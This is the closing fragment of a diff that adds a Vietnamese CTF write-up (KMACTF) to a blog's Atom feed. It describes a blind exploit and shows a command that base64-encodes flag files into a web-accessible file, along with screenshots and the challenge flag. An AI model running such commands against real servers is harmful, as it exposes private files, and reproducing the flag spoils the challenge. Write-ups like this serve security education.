+Host: localhost:8082
+Connection: keep-alive
+
+</code></pre>
+<p><img src="https://nduc193.github.io/assets/images/KMACTF/54.png" alt="image" /></p>
+<p>Vì nó luôn <code>die(1)</code> nên phải blind exploit.
+get Flag bằng cách copy file <code>flag.php</code> ra <code>/var/www/html</code></p>
+<p><code>cat /var/www/html/flag* |base64 &gt; /var/www/html/duc193_xxxxxx.txt</code>
+Được flag local :
+<img src="https://nduc193.github.io/assets/images/KMACTF/55.png" alt="image" /></p>
+<p>Flag server :
+<img src="https://nduc193.github.io/assets/images/KMACTF/56.png" alt="image" />
+<img src="https://nduc193.github.io/assets/images/KMACTF/57.png" alt="image" /></p>
+<p>Flag : <code>KMACTF{Y3s_it's__1dayupload_php_class_4nd_ex3cut3_it_⚆_⚆}</code></p>
+]]></content>
+            <author>
+                <name>duc193</name>
+            </author>
+            <category term="Writeup"></category>
+            <category term="Writeup" label="Writeup"></category>
+            </entry>
+        </feed>
